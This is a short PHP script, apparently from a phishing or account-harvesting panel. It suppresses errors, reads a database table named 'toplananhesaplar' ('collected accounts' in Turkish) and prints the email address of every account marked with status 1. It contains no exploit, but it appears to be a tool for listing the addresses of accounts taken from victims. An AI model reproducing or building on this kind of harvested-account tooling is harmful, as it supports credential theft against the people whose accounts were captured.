<?php
error_reporting(0);
include("files/ayar.php");
$sor = mysqli_query($mysqli, "select * from toplananhesaplar where Statu='1'");
while($cevap=mysqli_fetch_object($sor)){
	if(strlen($cevap->Mail) > 0){
	echo $cevap->Mail;
	echo "\n";
	}else{
	}
}
